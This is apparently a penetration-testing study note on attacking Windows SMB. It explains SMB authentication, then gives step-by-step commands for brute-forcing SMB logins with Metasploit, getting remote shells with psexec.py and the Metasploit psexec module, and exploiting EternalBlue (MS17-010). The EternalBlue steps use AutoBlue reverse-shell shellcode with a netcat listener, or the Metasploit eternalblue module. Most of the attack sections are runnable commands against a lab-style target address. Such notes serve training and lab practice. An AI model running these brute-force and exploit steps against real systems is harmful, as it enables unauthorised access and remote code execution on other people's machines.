
## **SMB AUTHENTICATION**

SMB (Server Message Block) 445. It runs on top of NetBIOS using port 139. Network file sharing protocol that is used to facilitate the sharing between hosts in a LAN.

SMB utilizes 2 levels of authentication:

*   User authentication (provide username and password)
*   Share authentication(provide password)

Both utilize a **challenge response authentication system**

> client sends authentication request
> 
> server asks for an encrypted string with user's hash
> 
> client sends the encrypted string
> 
> server grants access to client

## PsExec

Is a Telnet replacement developed By Microsoft. We can use PsExec to authenticate with the target system legitimately and run arbitrary commands or lunch remoce CMD.

_User accounts and password are required to exploit SMB via PsExec._

Steps

scan the target for ope ports and services

```plaintext
nmap -sV -sC -Pn 10.10.10.10
```

**brute-force smb with metasploit**

```plaintext
search smb_login
use …
show option
set RHOSTS 10.10.10.10
set RPORT 445
set USER_FILE
set PASS_FILE
set VERBOSE false
```

**Option1 :Use the python script psexec.py**

```plaintext
psexec.py Username@10.10.10.10 cmd.exe
userspassword
```

**Option 2: Use psexec utility from Metasploit if we want a meterpreter session. This will run a malicious file on the target system.**

search psexec

show options

set RHOST 10.10.10.10

set RPORT 445

set SMBUser

set SMBPass

---

## Eternal Blue Exploit (MS17-010).

_It's a Windows vulnerability that allows attackers to remotely execute arbitrary code and gain elevated access to Windows system._

_**Option1. Manual exploitation of SMB**_

check for eternal blue vulnerability using nmap

```plaintext
nmap -sV -p 445 --script=smb-vuln-ms17-010 10.10.10.10
```

Use [Auto-Blue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

Navigate to https://github.com/3ndG4me/AutoBlue-MS17-010/shelcode directory and set shell\_prep.sh to generate the shellcode

provide the script with executable permissions and execute it

```plaintext
chmod +x shell_prep.sh
./shell_prep.sh
```

can choose msfvenom reverse shell 

set LHOST and LPORT. Ports for x86 and x64 can be the same.

choose regular cmd shell

stageless payload

We should find the generated shellcode in current working directory

```plaintext
ls
sc_x64.bin
```

set up netcat listener

```plaintext
nc -nvlp 1234
```

navigate to /AutoBlue-MS17-010 directory to run eternalblue\_exploit10.py or else, depending on Windows version

```plaintext
chmod +x eternalblue_exploit10.py
python eternalblue_exploit10.py 10.10.10.10 shellcode/sc_x64.bin
```

check the netcat tab for command shell.

_**Option1. Automatic exploitation using Metasploit**_

_**msfconsole**_

```plaintext
search eternalblue
use /exploit/widows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.10
exploit
```
